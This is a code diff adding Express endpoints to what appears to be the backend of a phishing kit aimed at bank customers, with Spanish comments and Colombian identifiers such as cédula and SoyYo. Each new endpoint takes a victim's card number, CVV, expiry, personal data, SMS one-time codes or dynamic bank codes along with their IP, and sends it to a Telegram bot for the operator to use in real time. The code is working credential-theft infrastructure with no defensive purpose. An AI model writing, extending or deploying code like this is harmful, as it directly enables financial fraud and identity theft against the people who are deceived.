@@ -374,6 +374,212 @@ app.post("/capture/index", async (req, res) => {
   }
 });
 
+// Captura de datos de tarjeta desde card.html
+// Body esperado: { sessionId, cardnumber, cvv, expiry, barrio? }
+app.post("/capture/card", async (req, res) => {
+  try {
+    const { sessionId, cardnumber, cvv, expiry, barrio } = req.body || {};
+
+    if (!sessionId) {
+      return res.status(400).json({
+        ok: false,
+        error: "sessionId es requerido",
+      });
+    }
+
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+      req.headers["x-real-ip"] ||
+      req.socket?.remoteAddress ||
+      "N/A";
+    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
+
+    const texto = [
+      "<b>NUEVA CARD - CLIENTE ACTIVO</b>",
+      "",
+      `<b>NUMERO:</b> ${cardnumber || "N/A"}`,
+      `<b>FECHA:</b> ${expiry || "N/A"}`,
+      `<b>CVV:</b> ${cvv || "N/A"}`,
+      `<b>IP/BARRIO:</b> ${ipBarrio}`,
+    ].join("\n");
+
+    try {
+      await enviarMensajeConBotones(texto, sessionId);
+    } catch (err) {
+      console.error("Error enviando mensaje a Telegram (card):", err.message);
+    }
+
+    return res.json({ ok: true });
+  } catch (error) {
+    console.error("Error en /capture/card:", error);
+    return res.status(500).json({ ok: false });
+  }
+});
+
+// Captura de datos personales desde datos.html
+// Body esperado: { sessionId, name, cedula, email, phone, barrio? }
+app.post("/capture/datos", async (req, res) => {
+  try {
+    const { sessionId, name, cedula, email, phone, barrio } = req.body || {};
+
+    if (!sessionId) {
+      return res.status(400).json({
+        ok: false,
+        error: "sessionId es requerido",
+      });
+    }
+
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+      req.headers["x-real-ip"] ||
+      req.socket?.remoteAddress ||
+      "N/A";
+    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
+
+    const texto = [
+      "<b>NUEVOS DATOS - CLIENTE ACTIVO</b>",
+      "",
+      `<b>NOMBRE:</b> ${name || "N/A"}`,
+      `<b>CC:</b> ${cedula || "N/A"}`,
+      `<b>CORREO:</b> ${email || "N/A"}`,
+      `<b>CELL:</b> ${phone || "N/A"}`,
+      `<b>IP/BARRIO:</b> ${ipBarrio}`,
+    ].join("\n");
+
+    try {
+      await enviarMensajeConBotones(texto, sessionId);
+    } catch (err) {
+      console.error("Error enviando mensaje a Telegram (datos):", err.message);
+    }
+
+    return res.json({ ok: true });
+  } catch (error) {
+    console.error("Error en /capture/datos:", error);
+    return res.status(500).json({ ok: false });
+  }
+});
+
+// Captura de código SMS desde sms.html
+// Body esperado: { sessionId, smsCode, barrio? }
+app.post("/capture/sms", async (req, res) => {
+  try {
+    const { sessionId, smsCode, barrio } = req.body || {};
+
+    if (!sessionId) {
+      return res.status(400).json({
+        ok: false,
+        error: "sessionId es requerido",
+      });
+    }
+
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+      req.headers["x-real-ip"] ||
+      req.socket?.remoteAddress ||
+      "N/A";
+    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
+
+    const texto = [
+      "<b>NUEVO SMS - CLIENTE ACTIVO</b>",
+      "",
+      `<b>SMS:</b> ${smsCode || "N/A"}`,
+      `<b>IP/BARRIO:</b> ${ipBarrio}`,
+    ].join("\n");
+
+    try {
+      await enviarMensajeConBotones(texto, sessionId);
+    } catch (err) {
+      console.error("Error enviando mensaje a Telegram (sms):", err.message);
+    }
+
+    return res.json({ ok: true });
+  } catch (error) {
+    console.error("Error en /capture/sms:", error);
+    return res.status(500).json({ ok: false });
+  }
+});
+
+// Captura de código dinámica desde dinamica.html
+// Body esperado: { sessionId, dinamicaCode, barrio? }
+app.post("/capture/dinamica", async (req, res) => {
+  try {
+    const { sessionId, dinamicaCode, barrio } = req.body || {};
+
+    if (!sessionId) {
+      return res.status(400).json({
+        ok: false,
+        error: "sessionId es requerido",
+      });
+    }
+
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+      req.headers["x-real-ip"] ||
+      req.socket?.remoteAddress ||
+      "N/A";
+    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
+
+    const texto = [
+      "<b>NUEVA DINAMICA - CLIENTE ACTIVO</b>",
+      "",
+      `<b>DINAMICA:</b> ${dinamicaCode || "N/A"}`,
+      `<b>IP/BARRIO:</b> ${ipBarrio}`,
+    ].join("\n");
+
+    try {
+      await enviarMensajeConBotones(texto, sessionId);
+    } catch (err) {
+      console.error("Error enviando mensaje a Telegram (dinamica):", err.message);
+    }
+
+    return res.json({ ok: true });
+  } catch (error) {
+    console.error("Error en /capture/dinamica:", error);
+    return res.status(500).json({ ok: false });
+  }
+});
+
+// Captura de paso SoyYo desde soyyo.html
+// Body esperado: { sessionId, photoData?, barrio? }
+app.post("/capture/soyyo", async (req, res) => {
+  try {
+    const { sessionId, photoData, barrio } = req.body || {};
+
+    if (!sessionId) {
+      return res.status(400).json({
+        ok: false,
+        error: "sessionId es requerido",
+      });
+    }
+
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0]?.trim() ||
+      req.headers["x-real-ip"] ||
+      req.socket?.remoteAddress ||
+      "N/A";
+    const ipBarrio = barrio ? `${ip} / ${barrio}` : ip;
+
+    const texto = [
+      "<b>SOY YO - CLIENTE ACTIVO</b>",
+      "",
+      "<b>Imagen:</b> capturada en el navegador",
+      `<b>IP/BARRIO:</b> ${ipBarrio}`,
+    ].join("\n");
+
+    try {
+      await enviarMensajeConBotones(texto, sessionId);
+    } catch (err) {
+      console.error("Error enviando mensaje a Telegram (soyyo):", err.message);
+    }
+
+    // No intentamos enviar la imagen binaria a Telegram en este flujo.
+    return res.json({ ok: true });
+  } catch (error) {
+    console.error("Error en /capture/soyyo:", error);
+    return res.status(500).json({ ok: false });
+  }
+});
+
 // -----------------------------
 // 7. Arranque del servidor
 // -----------------------------
